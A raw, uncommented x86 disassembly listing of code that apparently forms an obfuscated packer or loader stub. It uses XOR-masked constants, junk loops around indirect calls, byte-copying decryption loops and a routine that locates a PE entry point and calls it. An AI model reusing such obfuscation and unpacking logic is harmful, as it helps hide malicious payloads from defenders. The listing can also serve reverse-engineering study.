  42275b:	mov    esp,0x77ad1acb
  422760:	mov    ebp,0x2db899a
  422765:	inc    ecx
  422766:	and    eax,0xd7c12042
  42276b:	cli    
  42276c:	int    0xff
  42276e:	shr    dh,0xeb
  422771:	sub    bp,0x39b9
  422776:	push   cs
  422777:	(bad)  
  422778:	jl     0x42279b
  42277a:	lock cdq 
  42277c:	and    BYTE PTR [ebp+0x65],0xac
  422780:	leave  
  422781:	jl     0x422733
  422783:	fld    DWORD PTR [ebx]
  422785:	nop
  422786:	pop    edx
  422787:	(bad)  
  422788:	jnp    0x4227d7
  42278a:	mov    eax,edi
  42278c:	jge    0x422714
  42278e:	sahf   
  42278f:	ja     0x4227dd
  422791:	sub    bl,dh
  422793:	lea    eax,[edi+0x7e]
  422796:	xchg   ebx,eax
  422797:	std    
  422798:	jl     0x42276e
  42279a:	aas    
  42279b:	sub    ch,ah
  42279d:	(bad)  
  42279e:	fisttp DWORD PTR [edi+edx*4]
  4227a1:	lahf   
  4227a2:	ins    BYTE PTR es:[edi],dx
  4227a3:	cmc    
  4227a4:	sti    
  4227a5:	sub    dl,BYTE PTR [eax]
  4227a7:	mov    ah,bl
  4227a9:	mov    dl,BYTE PTR [edi-0x7425298]
  4227af:	add    BYTE PTR [ecx+eax*2+0x27],dl
  4227b3:	mov    dh,0xf5
  4227b5:	cmp    eax,0xda9e94e3
  4227ba:	mov    ds:0x6481d2ae,al
  4227bf:	bound  ecx,QWORD PTR [esi-0xb]
  4227c2:	pop    edx
  4227c3:	stc    
  4227c4:	sbb    al,0x5a
  4227c6:	pusha  
  4227c7:	sbb    eax,0xb457ef81
  4227cc:	pop    ebp
  4227cd:	xchg   edi,eax
  4227ce:	ret    
  4227cf:	xor    eax,0xa07b5f2f
  4227d4:	(bad)  
  4227d5:	in     eax,0x1c
  4227d7:	bnd jmp DWORD PTR [ebp-0x33aa74fa]
  4227de:	jmp    0x42280a
  4227e3:	mov    edx,DWORD PTR [ebp-0x3c]
  4227e6:	mov    edi,DWORD PTR [ebp-0x4]
  4227e9:	xor    edx,eax
  4227eb:	xor    edi,eax
  4227ed:	add    edx,ecx
  4227ef:	add    edi,ecx
  4227f1:	imul   edx,edi
  4227f4:	mov    edi,DWORD PTR [ebp-0x8]
  4227f7:	mov    ebx,DWORD PTR [ebp-0x10]
  4227fa:	sub    ebx,edi
  4227fc:	cmp    ebx,edx
  4227fe:	mov    edx,DWORD PTR [ebp-0x38]
  422801:	jbe    0x42280a
  422807:	mov    edx,DWORD PTR [ebp-0x3c]
  42280a:	mov    edi,DWORD PTR [ebp-0x4]
  42280d:	xor    edi,eax
  42280f:	xor    edx,eax
  422811:	add    edi,ecx
  422813:	add    edx,ecx
  422815:	imul   edx,edi
  422818:	mov    DWORD PTR [ebp+0xc],edx
  42281b:	mov    edx,DWORD PTR [ebp+0xc]
  42281e:	mov    DWORD PTR [ebp-0x24],edx
  422821:	mov    edx,DWORD PTR [ebp-0x8]
  422824:	add    edx,DWORD PTR [ebp-0x40]
  422827:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  422838:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  42283f:	mov    edx,DWORD PTR [ebp-0x18]
  422842:	xor    edx,eax
  422844:	add    edx,ecx
  422846:	jmp    0x4228b3
  42284b:	mov    edx,DWORD PTR [ebp-0x18]
  42284e:	xor    edx,eax
  422850:	add    edx,DWORD PTR [ebp-0x14]
  422853:	mov    edi,DWORD PTR [ebp-0x1c]
  422856:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  42285d:	mov    BYTE PTR [ebp+0xf],dl
  422860:	mov    edx,DWORD PTR [ebp-0xc]
  422863:	xor    edx,eax
  422865:	add    edx,DWORD PTR [ebp-0x14]
  422868:	mov    edi,DWORD PTR [ebp-0x1c]
  42286b:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  422872:	mov    BYTE PTR [ebp+0xb],dl
  422875:	mov    dl,BYTE PTR [ebp+0xf]
  422878:	mov    edi,DWORD PTR [ebp-0xc]
  42287b:	xor    edi,eax
  42287d:	add    edi,DWORD PTR [ebp-0x14]
  422880:	mov    ebx,DWORD PTR [ebp-0x1c]
  422883:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  42288a:	mov    dl,BYTE PTR [ebp+0xb]
  42288d:	mov    edi,DWORD PTR [ebp-0x18]
  422890:	xor    edi,eax
  422892:	add    edi,DWORD PTR [ebp-0x14]
  422895:	mov    ebx,DWORD PTR [ebp-0x1c]
  422898:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  42289f:	mov    edx,DWORD PTR [ebp-0x44]
  4228a2:	mov    edi,DWORD PTR [ebp-0xc]
  4228a5:	xor    edx,eax
  4228a7:	xor    edi,eax
  4228a9:	add    edx,ecx
  4228ab:	add    edi,ecx
  4228ad:	imul   edx,edi
  4228b0:	add    edx,DWORD PTR [ebp-0x14]
  4228b3:	mov    DWORD PTR [ebp-0x14],edx
  4228b6:	mov    edx,DWORD PTR [ebp-0xc]
  4228b9:	mov    edi,DWORD PTR [ebp-0x24]
  4228bc:	xor    edx,eax
  4228be:	add    edx,ecx
  4228c0:	imul   edx,edi
  4228c3:	mov    edi,DWORD PTR [ebp-0xc]
  4228c6:	xor    edi,eax
  4228c8:	sub    edx,edi
  4228ca:	mov    edi,DWORD PTR [ebp-0xc]
  4228cd:	mov    ebx,DWORD PTR [ebp-0x14]
  4228d0:	xor    edi,eax
  4228d2:	add    edi,ecx
  4228d4:	imul   edi,ebx
  4228d7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228da:	xor    ebx,eax
  4228dc:	sub    edx,ecx
  4228de:	lea    edi,[edi+ebx*1+0x327298]
  4228e5:	cmp    edi,edx
  4228e7:	jbe    0x42284b
  4228ed:	mov    edx,DWORD PTR [ebp-0xc]
  4228f0:	mov    edi,DWORD PTR [ebp-0x24]
  4228f3:	xor    edx,eax
  4228f5:	add    edx,ecx
  4228f7:	imul   edx,edi
  4228fa:	mov    edi,DWORD PTR [ebp-0x18]
  4228fd:	xor    edi,eax
  4228ff:	add    edx,edi
  422901:	mov    edi,DWORD PTR [ebp-0x8]
  422904:	lea    edx,[edx+edi*1+0x327298]
  42290b:	mov    DWORD PTR [ebp-0x8],edx
  42290e:	mov    edx,DWORD PTR [ebp-0x20]
  422911:	xor    edx,eax
  422913:	mov    edi,0xffcd8d68
  422918:	sub    edi,edx
  42291a:	add    edi,DWORD PTR [ebp-0x10]
  42291d:	mov    edx,DWORD PTR [ebp-0x20]
  422920:	mov    ebx,DWORD PTR [ebp-0x8]
  422923:	xor    edx,eax
  422925:	add    edx,ecx
  422927:	imul   edx,ebx
  42292a:	cmp    edx,edi
  42292c:	jbe    0x41a739
  422932:	pop    ebx
  422933:	pop    edi
  422934:	leave  
  422935:	ret    0x8
  422938:	push   ebp
  422939:	mov    ebp,esp
  42293b:	push   ecx
  42293c:	mov    ecx,DWORD PTR [ebp+0x8]
  42293f:	mov    eax,0x7510850
  422944:	xor    ecx,eax
  422946:	adc    DWORD PTR ds:0x42a341,0x62
  422950:	add    ecx,0x327298
  422956:	mov    DWORD PTR [ebp+0x10],ecx
  422959:	mov    ecx,0x3ff3
  42295e:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  422965:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  42296c:	mov    ecx,0xf89c8539
  422971:	push   esi
  422972:	mov    DWORD PTR [ebp+0x10],0x70019fa
  422979:	mov    DWORD PTR ds:0x42a341,0x2038
  422983:	mov    esi,DWORD PTR [ebp-0x4]
  422986:	mov    DWORD PTR ds:0x42a2fd,0x2b16
  422990:	cmp    ecx,esi
  422992:	mov    DWORD PTR ds:0x42a2e5,0x385
  42299c:	je     0x422a00
  4229a2:	dec    esi
  4229a3:	mov    esi,DWORD PTR [ebp+0xc]
  4229a6:	adc    DWORD PTR ds:0x42a2e9,0x2ac0
  4229b0:	xor    ecx,eax
  4229b2:	add    DWORD PTR ds:0x42a40d,0x42a345
  4229bc:	xor    esi,eax
  4229be:	sub    DWORD PTR ds:0x42a33d,0x42a371
  4229c8:	lea    ecx,[esi+ecx*1+0x327298]
  4229cf:	sub    DWORD PTR ds:0x42a3b1,0x25a4
  4229d9:	xor    ecx,eax
  4229db:	mov    DWORD PTR ds:0x42a409,0x18df
  4229e5:	cmp    ecx,0xf89c8528
  4229eb:	jne    0x422972
  4229f1:	mov    DWORD PTR ds:0x42a301,0x7006
  4229fb:	jmp    0x422a78
  422a00:	mov    esi,DWORD PTR ds:0x42a3ed
  422a06:	mov    esi,DWORD PTR [esi]
  422a08:	xor    DWORD PTR ds:0x42a2f5,esi
  422a0e:	add    ecx,0xffcd8d68
  422a14:	mov    esi,DWORD PTR ds:0x42a379
  422a1a:	and    esi,DWORD PTR ds:0x42a2fd
  422a20:	mov    DWORD PTR ds:0x42a379,esi
  422a26:	mov    esi,ecx
  422a28:	adc    DWORD PTR ds:0x42a301,0x42a2f5
  422a32:	xor    esi,eax
  422a34:	add    esi,DWORD PTR [ebp+0x8]
  422a37:	sbb    DWORD PTR ds:0x42a385,0x42a3b9
  422a41:	mov    DWORD PTR [ebp+0x8],esi
  422a44:	mov    esi,DWORD PTR ds:0x42a371
  422a4a:	or     DWORD PTR ds:0x42a37d,esi
  422a50:	mov    esi,DWORD PTR [ebp+0x8]
  422a53:	or     DWORD PTR ds:0x42a40d,0x42a401
  422a5d:	xor    esi,ecx
  422a5f:	xor    esi,eax
  422a61:	mov    eax,DWORD PTR [edx+0x194]
  422a67:	mov    ecx,DWORD PTR [eax]
  422a69:	mov    eax,DWORD PTR [ecx+0x3c]
  422a6c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  422a70:	add    eax,ecx
  422a72:	mov    DWORD PTR [ebp+0x8],esi
  422a75:	mov    DWORD PTR [ebp+0x10],eax
  422a78:	mov    eax,DWORD PTR [ebp+0x10]
  422a7b:	pop    esi
  422a7c:	test   eax,eax
  422a7e:	je     0x422aa2
  422a84:	push   DWORD PTR ds:0x426bba
  422a8a:	push   DWORD PTR ds:0x426966
  422a90:	mov    eax,DWORD PTR [edx+0x194]
  422a96:	push   DWORD PTR [eax]
  422a98:	mov    eax,DWORD PTR [ebp+0x10]
  422a9b:	call   eax
  422a9d:	jmp    0x422aa5
  422aa2:	mov    eax,DWORD PTR [ebp+0x10]
  422aa5:	leave  
  422aa6:	ret    0xc
  422aa9:	push   ebp
  422aaa:	mov    ebp,esp
  422aac:	sub    esp,0x40
  422aaf:	sbb    DWORD PTR ds:0x42a3c1,ebx
  422ab5:	push   ebx
  422ab6:	and    DWORD PTR ds:0x42a2e1,0x0
  422ac0:	mov    ecx,DWORD PTR ds:0x42a2e1
  422ac6:	inc    ecx
  422ac7:	mov    DWORD PTR ds:0x42a2e1,ecx
  422acd:	cmp    DWORD PTR ds:0x42a2e1,0x10
  422ad4:	jne    0x422b13
  422ada:	push   DWORD PTR [ebp-0x28]
  422add:	push   DWORD PTR [ebp-0x18]
  422ae0:	push   DWORD PTR [ebp-0x14]
  422ae3:	push   0x306f
  422ae8:	push   DWORD PTR [ebp-0x18]
  422aeb:	push   0x1d07
  422af0:	push   DWORD PTR [ebp-0x24]
  422af3:	push   0x5967
  422af8:	push   DWORD PTR [ebp-0x28]
  422afb:	push   0x32c4
  422b00:	push   0x1f22
  422b05:	push   0x72e0
  422b0a:	push   DWORD PTR [ebp-0x24]
  422b0d:	call   DWORD PTR ds:0x425008
  422b13:	cmp    DWORD PTR ds:0x42a2e1,0xf
  422b1a:	jne    0x422b2d
  422b20:	mov    ecx,DWORD PTR ds:0x42a2e1
  422b26:	inc    ecx
  422b27:	mov    DWORD PTR ds:0x42a2e1,ecx
  422b2d:	cmp    DWORD PTR ds:0x42a2e1,0x1f
  422b34:	jb     0x422ac0
  422b3a:	add    DWORD PTR ds:0x42a2f9,0x3d7
  422b44:	push   esi
  422b45:	and    DWORD PTR ds:0x42a389,0x0
  422b4f:	xor    ecx,ecx
  422b51:	add    ecx,DWORD PTR ds:0x42a389
  422b57:	inc    ecx
  422b58:	mov    DWORD PTR ds:0x42a389,ecx
  422b5e:	cmp    DWORD PTR ds:0x42a389,0xb
  422b65:	jne    0x422b7e
  422b6b:	push   DWORD PTR [ebp-0x18]
  422b6e:	push   0x23c4
  422b73:	push   0x7367
  422b78:	call   DWORD PTR ds:0x42500c
  422b7e:	cmp    DWORD PTR ds:0x42a389,0xa
  422b85:	jne    0x422b98
  422b8b:	mov    ecx,DWORD PTR ds:0x42a389
  422b91:	inc    ecx
  422b92:	mov    DWORD PTR ds:0x42a389,ecx
  422b98:	cmp    DWORD PTR ds:0x42a389,0x13
  422b9f:	jb     0x422b4f
  422ba5:	push   edi
  422ba6:	sub    ecx,DWORD PTR ds:0x42a2f5
  422bac:	lea    eax,ds:0x426c3e
  422bb2:	push   eax
  422bb3:	push   DWORD PTR ds:0x426c3a
  422bb9:	not    ecx
  422bbb:	push   0x0
  422bbd:	lea    eax,ds:0x42525c
  422bc3:	inc    eax
  422bc4:	inc    eax
  422bc5:	and    DWORD PTR ds:0x42a38d,0x0
  422bcf:	xor    ecx,ecx
  422bd1:	xor    ecx,DWORD PTR ds:0x42a38d
  422bd7:	inc    ecx
  422bd8:	mov    DWORD PTR ds:0x42a38d,ecx
  422bde:	cmp    DWORD PTR ds:0x42a38d,0x1d
  422be5:	jne    0x422c00
  422beb:	push   0x42a5c5
  422bf0:	push   0x42a569
  422bf5:	push   0x400000
  422bfa:	call   DWORD PTR ds:0x4251e8
  422c00:	cmp    DWORD PTR ds:0x42a38d,0x13
  422c07:	jb     0x422bcf
  422c0d:	and    DWORD PTR ds:0x42a401,0x0
  422c17:	xor    ecx,ecx
  422c19:	or     ecx,DWORD PTR ds:0x42a401
  422c1f:	inc    ecx
  422c20:	mov    DWORD PTR ds:0x42a401,ecx
  422c26:	cmp    DWORD PTR ds:0x42a401,0x9
  422c2d:	jne    0x422c49
  422c33:	push   0x4ac4
  422c38:	push   DWORD PTR [ebp-0x1c]
  422c3b:	push   0x42a57d
  422c40:	push   DWORD PTR [ebp-0x28]
  422c43:	call   DWORD PTR ds:0x425010
  422c49:	cmp    DWORD PTR ds:0x42a401,0x8
  422c50:	jne    0x422c63
  422c56:	mov    ecx,DWORD PTR ds:0x42a401
  422c5c:	inc    ecx
  422c5d:	mov    DWORD PTR ds:0x42a401,ecx
  422c63:	cmp    DWORD PTR ds:0x42a401,0x11
  422c6a:	jb     0x422c17
  422c70:	mov    DWORD PTR ds:0x42a2f1,0x19
  422c7a:	cmp    DWORD PTR ds:0x42a2f1,0x0
  422c81:	je     0x422cb7
  422c87:	cmp    DWORD PTR ds:0x42a2f1,0x28
  422c8e:	jne    0x422c9f
  422c94:	push   0x48e8
  422c99:	call   DWORD PTR ds:0x4251ec
  422c9f:	mov    ecx,DWORD PTR ds:0x42a2f1
  422ca5:	dec    ecx
  422ca6:	mov    DWORD PTR ds:0x42a2f1,ecx
  422cac:	jmp    0x422c7a
  422cb1:	adc    ecx,DWORD PTR ds:0x42a3f5
  422cb7:	push   0x0
  422cb9:	pop    ecx
  422cba:	sub    DWORD PTR ds:0x42a331,0x4325
  422cc4:	xor    ecx,DWORD PTR [eax-0x2]
  422cc7:	adc    DWORD PTR ds:0x42a2e9,0x42a375
  422cd1:	call   ecx
  422cd3:	cmp    DWORD PTR ds:0x426c3e,0x7175fa8e
  422cdd:	jne    0x422cf5
  422ce3:	xor    eax,eax
  422ce5:	mov    DWORD PTR ds:0x42a34d,0x6b63
  422cef:	inc    eax
  422cf0:	jmp    0x42316a
  422cf5:	sub    DWORD PTR ds:0x42a335,ecx
  422cfb:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  422d02:	adc    ebx,ecx
  422d04:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  422d0b:	lea    eax,[ebp-0x20]
  422d0e:	xor    edi,DWORD PTR ds:0x42a34d
  422d14:	mov    DWORD PTR [ebp-0x38],eax
  422d17:	lea    eax,[ebp-0x1c]
  422d1a:	mov    DWORD PTR [ebp-0x28],eax
  422d1d:	sub    DWORD PTR ds:0x42a2d9,0x6262
  422d27:	mov    eax,ds:0x426ae2
  422d2c:	mov    edi,DWORD PTR ds:0x42a405
  422d32:	sub    DWORD PTR ds:0x42a34d,edi
  422d38:	mov    eax,DWORD PTR [eax+0x1c8]
  422d3e:	mov    eax,DWORD PTR [eax]
  422d40:	xor    DWORD PTR ds:0x42a301,ecx
  422d46:	mov    ecx,DWORD PTR [ebp-0x28]
  422d49:	and    DWORD PTR ds:0x42a3c1,0x0
  422d53:	jmp    0x422d67
  422d58:	xor    edi,edi
  422d5a:	or     edi,DWORD PTR ds:0x42a3c1
  422d60:	inc    edi
  422d61:	mov    DWORD PTR ds:0x42a3c1,edi
  422d67:	cmp    DWORD PTR ds:0x42a3c1,0x12
  422d6e:	jae    0x422e43
  422d74:	cmp    DWORD PTR ds:0x42a3c1,0xc
  422d7b:	jne    0x422d91
  422d81:	push   0x42a4c5
  422d86:	push   0x400000
  422d8b:	call   DWORD PTR ds:0x425028
  422d91:	cmp    DWORD PTR ds:0x42a3c1,0xb
  422d98:	jne    0x422dad
  422d9e:	xor    edi,edi
  422da0:	or     edi,DWORD PTR ds:0x42a3c1
  422da6:	inc    edi
  422da7:	mov    DWORD PTR ds:0x42a3c1,edi
  422dad:	jmp    0x422d58
  422db2:	and    DWORD PTR ds:0x42a409,0x0
  422dbc:	mov    ebx,DWORD PTR ds:0x42a409
  422dc2:	inc    ebx
  422dc3:	mov    DWORD PTR ds:0x42a409,ebx
  422dc9:	cmp    DWORD PTR ds:0x42a409,0x1b
  422dd0:	jne    0x422dde
  422dd6:	push   0x1
  422dd8:	call   DWORD PTR ds:0x42502c
  422dde:	cmp    DWORD PTR ds:0x42a409,0x18
  422de5:	jb     0x422dbc
  422deb:	and    DWORD PTR ds:0x42a3fd,0x0
  422df5:	xor    edi,edi
  422df7:	or     edi,DWORD PTR ds:0x42a3fd
  422dfd:	inc    edi
  422dfe:	mov    DWORD PTR ds:0x42a3fd,edi
  422e04:	cmp    DWORD PTR ds:0x42a3fd,0x4
  422e0b:	jne    0x422e1a
  422e11:	push   DWORD PTR [ebp-0x28]
  422e14:	call   DWORD PTR ds:0x425014
  422e1a:	cmp    DWORD PTR ds:0x42a3fd,0x3
  422e21:	jne    0x422e36
  422e27:	xor    edi,edi
  422e29:	xor    edi,DWORD PTR ds:0x42a3fd
  422e2f:	inc    edi
  422e30:	mov    DWORD PTR ds:0x42a3fd,edi
  422e36:	cmp    DWORD PTR ds:0x42a3fd,0x14
  422e3d:	jb     0x422df5
  422e43:	mov    esi,0x7510850
  422e48:	xor    eax,esi
  422e4a:	adc    DWORD PTR ds:0x42a3cd,0x42a331
  422e54:	mov    edi,0x327298
  422e59:	and    DWORD PTR ds:0x42a2e5,0x0
  422e63:	jmp    0x422e75
  422e68:	mov    ebx,DWORD PTR ds:0x42a2e5
  422e6e:	inc    ebx
  422e6f:	mov    DWORD PTR ds:0x42a2e5,ebx
  422e75:	cmp    DWORD PTR ds:0x42a2e5,0x1f
  422e7c:	jae    0x422e9f
  422e82:	cmp    DWORD PTR ds:0x42a2e5,0x29
  422e89:	jne    0x422e9a
  422e8f:	push   0x4205
  422e94:	call   DWORD PTR ds:0x425030
  422e9a:	jmp    0x422e68
  422e9f:	add    eax,edi
  422ea1:	mov    DWORD PTR [ecx],eax
  422ea3:	mov    eax,ds:0x426d1e
  422ea8:	cmp    eax,0x22b01f34
  422ead:	movzx  ebx,BYTE PTR ds:0x42a3c5
  422eb4:	mov    eax,DWORD PTR [ebp-0x4]
  422eb7:	mov    ebx,0xf89c853c
  422ebc:	je     0x422ef8
  422ec2:	sbb    ecx,0x61f7
  422ec8:	mov    ecx,DWORD PTR [ebp-0x8]
  422ecb:	xor    eax,esi
  422ecd:	xor    DWORD PTR ds:0x42a2f9,0x5cd8
  422ed7:	add    eax,edi
  422ed9:	or     DWORD PTR ds:0x42a2ed,0x42a3f5
  422ee3:	imul   eax,ecx
  422ee6:	mov    DWORD PTR [ebp-0x8],eax
  422ee9:	mov    DWORD PTR ds:0x42a349,0x5f87
  422ef3:	jmp    0x422f4c
  422ef8:	xor    eax,esi
  422efa:	or     DWORD PTR ds:0x42a34d,ebx
  422f00:	add    eax,edi
  422f02:	add    DWORD PTR ds:0x42a3cd,edi
  422f08:	mov    ds:0x426bf6,eax
  422f0d:	mov    eax,DWORD PTR [ebp-0x8]
  422f10:	inc    DWORD PTR ds:0x42a34d
  422f16:	xor    eax,esi
  422f18:	add    eax,edi
  422f1a:	inc    ecx
  422f1b:	mov    ds:0x426d1e,eax
  422f20:	mov    eax,DWORD PTR [ebp-0x4]
  422f23:	sub    DWORD PTR ds:0x42a3cd,0x42a385
  422f2d:	mov    ecx,DWORD PTR ds:0x426bf6
  422f33:	xor    eax,esi
  422f35:	add    eax,edi
  422f37:	cmp    ecx,eax
  422f39:	jne    0x422f4c
  422f3f:	push   ebx
  422f40:	push   DWORD PTR [ebp-0x4]
  422f43:	push   DWORD PTR [ebp-0x8]
  422f46:	call   DWORD PTR ds:0x426bee
  422f4c:	mov    eax,ds:0x426ae2
  422f51:	mov    eax,DWORD PTR [eax+0x18c]
  422f57:	mov    eax,DWORD PTR [eax]
  422f59:	mov    DWORD PTR [ebp-0x3c],eax
  422f5c:	mov    DWORD PTR [ebp-0x34],ebx
  422f5f:	mov    DWORD PTR [ebp-0x34],ebx
  422f62:	mov    DWORD PTR [ebp-0x34],ebx
  422f65:	mov    DWORD PTR [ebp-0x2c],0xf89c8538
  422f6c:	mov    DWORD PTR [ebp-0x34],ebx
  422f6f:	mov    DWORD PTR [ebp-0x34],0xf89c8520
  422f76:	mov    eax,DWORD PTR [ebp-0x8]
  422f79:	xor    eax,esi
  422f7b:	add    eax,edi
  422f7d:	jmp    0x423049
  422f82:	mov    ecx,DWORD PTR [ebp-0x4]
  422f85:	xor    ecx,esi
  422f87:	lea    ecx,[ecx+eax*1+0x327298]
  422f8e:	mov    DWORD PTR [ebp-0x18],ecx
  422f91:	mov    ecx,DWORD PTR [ebp-0x2c]
  422f94:	xor    ecx,esi
  422f96:	lea    ecx,[ebp+ecx*1+0x3272a0]
  422f9d:	mov    DWORD PTR [ebp-0x34],ecx
  422fa0:	mov    ecx,DWORD PTR ds:0x426ae2
  422fa6:	mov    ecx,DWORD PTR [ecx+0x1bc]
  422fac:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  422fb3:	mov    DWORD PTR [ebp-0x30],ecx
  422fb6:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  422fbd:	mov    ecx,DWORD PTR [ebp-0x14]
  422fc0:	mov    edx,DWORD PTR [ebp-0x18]
  422fc3:	xor    ecx,esi
  422fc5:	add    ecx,edi
  422fc7:	cmp    edx,ecx
  422fc9:	je     0x42303d
  422fcf:	mov    ecx,DWORD PTR [ebp-0x14]
  422fd2:	mov    edx,DWORD PTR [ebp-0xc]
  422fd5:	xor    edx,esi
  422fd7:	mov    ebx,0xffcd8d68
  422fdc:	sub    ebx,edx
  422fde:	add    ebx,DWORD PTR [ebp-0x18]
  422fe1:	xor    ecx,esi
  422fe3:	add    ecx,edi
  422fe5:	mov    DWORD PTR [ebp-0x24],ecx
  422fe8:	cmp    ecx,ebx
  422fea:	ja     0x42303d
  422ff0:	mov    eax,DWORD PTR [ebp-0x14]
  422ff3:	mov    edx,DWORD PTR [ebp-0xc]
  422ff6:	xor    edx,esi
  422ff8:	add    edx,edi
  422ffa:	imul   edx,ecx
  422ffd:	xor    eax,esi
  422fff:	add    eax,ecx
  423001:	mov    ecx,DWORD PTR [ebp-0x30]
  423004:	mov    ebx,DWORD PTR [ebp-0x34]
  423007:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  42300e:	mov    BYTE PTR [edx+ecx*1],al
  423011:	mov    eax,DWORD PTR [ebp-0xc]
  423014:	mov    ecx,DWORD PTR [ebp-0x24]
  423017:	xor    eax,esi
  423019:	lea    ecx,[ecx+eax*1+0x327298]
  423020:	mov    eax,DWORD PTR [ebp-0xc]
  423023:	xor    eax,esi
  423025:	mov    edx,0xffcd8d68
  42302a:	sub    edx,eax
  42302c:	add    edx,DWORD PTR [ebp-0x18]
  42302f:	mov    DWORD PTR [ebp-0x24],ecx
  423032:	cmp    ecx,edx
  423034:	jbe    0x422ff0
  42303a:	mov    eax,DWORD PTR [ebp-0x28]
  42303d:	mov    ecx,DWORD PTR [ebp-0x4]
  423040:	xor    ecx,esi
  423042:	lea    eax,[eax+ecx*1+0x327298]
  423049:	mov    ecx,DWORD PTR [ebp-0x4]
  42304c:	mov    edx,DWORD PTR [ebp-0x4]
  42304f:	xor    edx,esi
  423051:	xor    ecx,esi
  423053:	add    ecx,edx
  423055:	mov    edx,DWORD PTR [ebp-0x4]
  423058:	xor    edx,esi
  42305a:	lea    ecx,[ecx+edx*1+0x9757c8]
  423061:	mov    DWORD PTR [ebp-0x28],eax
  423064:	cmp    eax,ecx
  423066:	jbe    0x422f82
  42306c:	mov    eax,DWORD PTR [ebp+0xc]
  42306f:	mov    ds:0x426966,eax
  423074:	mov    eax,DWORD PTR [ebp+0x10]
  423077:	mov    ds:0x426bba,eax
  42307c:	mov    eax,ds:0x426966
  423081:	mov    ecx,DWORD PTR [ebp-0x38]
  423084:	push   DWORD PTR [ebp-0x3c]
  423087:	sub    eax,edi
  423089:	push   DWORD PTR [ebp-0x1c]
  42308c:	xor    eax,esi
  42308e:	mov    DWORD PTR [ecx],eax
  423090:	push   DWORD PTR [ebp-0x20]
  423093:	call   0x4240cd
  423098:	sub    eax,edi
  42309a:	xor    eax,esi
  42309c:	mov    DWORD PTR [ebp+0xc],eax
  42309f:	mov    ecx,DWORD PTR [ebp-0x4]
  4230a2:	mov    eax,DWORD PTR [ebp+0xc]
  4230a5:	xor    ecx,esi
  4230a7:	add    ecx,edi
  4230a9:	xor    edx,edx
  4230ab:	div    ecx
  4230ad:	mov    ecx,DWORD PTR [ebp-0x8]
  4230b0:	cmp    ecx,eax
  4230b2:	jne    0x4230bd
  4230b8:	call   0x401000
  4230bd:	lea    eax,[ebp+0x4]
  4230c0:	mov    DWORD PTR [ebp-0x40],eax
  4230c3:	mov    eax,ds:0x426ae2
  4230c8:	add    eax,0x1cc
  4230cd:	mov    DWORD PTR [ebp-0x34],eax
  4230d0:	lea    eax,[ebp-0x10]
  4230d3:	mov    DWORD PTR [ebp+0x10],0xf89c8538
  4230da:	mov    DWORD PTR [ebp-0x38],eax
  4230dd:	mov    DWORD PTR [ebp+0xc],0xf89c8539
  4230e4:	mov    eax,DWORD PTR [ebp+0x10]
  4230e7:	xor    eax,esi
  4230e9:	mov    DWORD PTR [ebp-0x18],0x4
  4230f0:	mov    ecx,DWORD PTR [ebp-0x18]
  4230f3:	add    eax,edi
  4230f5:	cmp    ecx,eax
  4230f7:	je     0x423153
  4230fd:	mov    eax,DWORD PTR [ebp+0x10]
  423100:	xor    eax,esi
  423102:	add    eax,edi
  423104:	jmp    0x423139
  423109:	mov    ecx,DWORD PTR [ebp+0x10]
  42310c:	mov    edx,DWORD PTR [ebp+0xc]
  42310f:	xor    edx,esi
  423111:	add    edx,edi
  423113:	imul   edx,eax
  423116:	xor    ecx,esi
  423118:	add    ecx,eax
  42311a:	mov    eax,DWORD PTR [ebp-0x38]
  42311d:	mov    ebx,DWORD PTR [ebp-0x34]
  423120:	mov    cl,BYTE PTR [ebx+ecx*1+0x327298]
  423127:	mov    BYTE PTR [edx+eax*1],cl
  42312a:	mov    eax,DWORD PTR [ebp+0xc]
  42312d:	mov    ecx,DWORD PTR [ebp-0x28]
  423130:	xor    eax,esi
  423132:	lea    eax,[ecx+eax*1+0x327298]
  423139:	mov    ecx,DWORD PTR [ebp+0xc]
  42313c:	xor    ecx,esi
  42313e:	mov    edx,0xffcd8d68
  423143:	sub    edx,ecx
  423145:	add    edx,DWORD PTR [ebp-0x18]
  423148:	mov    DWORD PTR [ebp-0x28],eax
  42314b:	cmp    eax,edx
  42314d:	jbe    0x423109
  423153:	mov    eax,DWORD PTR [ebp-0x10]
  423156:	mov    eax,DWORD PTR [ebp-0x4]
  423159:	push   DWORD PTR [ebp-0x8]
  42315c:	lea    eax,[ebp-0x40]
  42315f:	push   eax
  423160:	call   0x424645
  423165:	mov    eax,DWORD PTR [ebp-0x10]
  423168:	mov    eax,DWORD PTR [eax]
  42316a:	pop    edi
  42316b:	pop    esi
  42316c:	pop    ebx
  42316d:	leave  
  42316e:	ret    0xc
  423171:	push   ebp
  423172:	mov    ebp,esp
  423174:	push   ecx
  423175:	mov    DWORD PTR ds:0x42a2fd,0x65b6
  42317f:	push   ecx
  423180:	movzx  ecx,WORD PTR ds:0x42a3f9
  423187:	mov    eax,0x5a3fc9f
  42318c:	mov    DWORD PTR [ebp-0x4],eax
  42318f:	mov    ecx,DWORD PTR ds:0x42a371
  423195:	mov    ecx,DWORD PTR [ebp-0x4]
  423198:	mov    DWORD PTR [ebp-0x8],0x4f35
  42319f:	mov    DWORD PTR ds:0x42a3cd,0x699b
  4231a9:	cmp    ecx,eax
  4231ab:	jne    0x42324c
  4231b1:	mov    ax,WORD PTR [ebp-0x8]
  4231b5:	mov    DWORD PTR ds:0x42a409,0x1e
  4231bf:	cmp    DWORD PTR ds:0x42a409,0x0
  4231c6:	je     0x42320d
  4231cc:	cmp    DWORD PTR ds:0x42a409,0xf
  4231d3:	jne    0x4231df
  4231d9:	call   DWORD PTR ds:0x4251f0
  4231df:	cmp    DWORD PTR ds:0x42a409,0x10
  4231e6:	jne    0x4231fb
